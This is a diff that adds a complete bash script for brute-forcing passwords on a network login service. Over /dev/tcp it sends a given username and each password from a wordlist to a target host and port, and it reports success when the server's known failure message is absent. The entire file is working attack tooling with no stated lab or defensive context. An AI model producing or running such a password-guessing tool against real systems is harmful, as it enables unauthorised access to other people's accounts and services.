@@ -1,0 +1,101 @@
+#!/bin/bash
+
+# Check if the correct number of arguments is provided
+if [ "$#" -lt 5 ]; then
+    echo "Usage: $0 <IP> <PORT> <USERNAME> <WORDLIST> <FAIL_RESPONSE> [-v]"
+    exit 1
+fi
+
+# Color codes
+RED='\033[0;31m'       # Red color for fail responses
+GREEN='\033[1;32m'     # Bold green color for successful responses
+NC='\033[0m'           # No color (reset)
+YELLOW='\033[1;33m'    # Yellow
+
+
+# Default verbosity mode
+verbose=false
+
+# Handle the verbosity flag (-v)
+if [ "${@: -1}" == "-v" ]; then
+    verbose=true
+    fail_response="${@: -2:1}"
+else
+    fail_response="${@: -1}"
+fi
+
+host="$1"            # First argument: IP address
+port="$2"            # Second argument: PORT
+username="$3"        # Third argument: USERNAME
+wordlist="$4"        # Fourth argument: WORDLIST file
+
+echo "Starting connection to $host on port $port using wordlist: $wordlist"
+echo "Waiting for fail response: '$fail_response'"
+
+# Read passwords from the wordlist
+while IFS= read -r password; do
+    echo "----------------------------------------"
+
+    # Debug: Print current action in one line (verbose mode only)
+    if $verbose; then
+        echo "Attempting login with: Username: $username, Password: $password"
+    fi
+
+    # Start the connection using `nc` in an interactive way, handling both prompts
+    if $verbose; then
+        echo "Opening connection to server and sending username..."
+    fi
+    exec 3<>/dev/tcp/$host/$port
+
+    # Send the username, followed by a newline to simulate pressing Enter
+    echo "$username" >&3
+    if $verbose; then
+        echo "Username sent. Waiting for '$fail_response' fail response..."
+    fi
+
+    # Read the server's response after sending the username
+    server_response=$(head -n 1 <&3)
+    if $verbose; then
+        echo -e "Server response: $server_response"
+    fi
+
+    # Send the password after receiving the expected fail response
+    if echo "$server_response" | grep -q "$fail_response"; then
+        if $verbose; then
+            echo "Sending password..."
+        fi
+        echo "$password" >&3
+
+        # Capture the response after sending the password
+        response=$(head -n 1 <&3)
+
+        # Check if the response contains part of the fail response
+        if echo "$response" | grep -q "$fail_response"; then
+            echo -e "Server response after sending password ${YELLOW}$password${NC} : ${RED}$response${NC}"
+        else
+            echo -e "Server response after sending password: ${GREEN}$response${NC}"
+
+            # Password is correct if the fail response is not found
+            echo "========================================"
+            echo -e "Password found: ${GREEN}$password${NC}"
+            echo "Exiting script."
+            exit 0
+        fi
+    else
+        echo -e "${RED}Did not receive '$fail_response' fail response. Aborting.${NC}"
+        break
+    fi
+
+    if $verbose; then
+        echo "----------------------------------------" 
+        echo -e "'$fail_response' fail response still present. Trying the next password..."
+    fi
+
+    # Close the connection after each attempt
+    exec 3<&-
+    exec 3>&-
+
+done < "$wordlist"
+
+echo "----------------------------------------"
+echo "No valid password found."
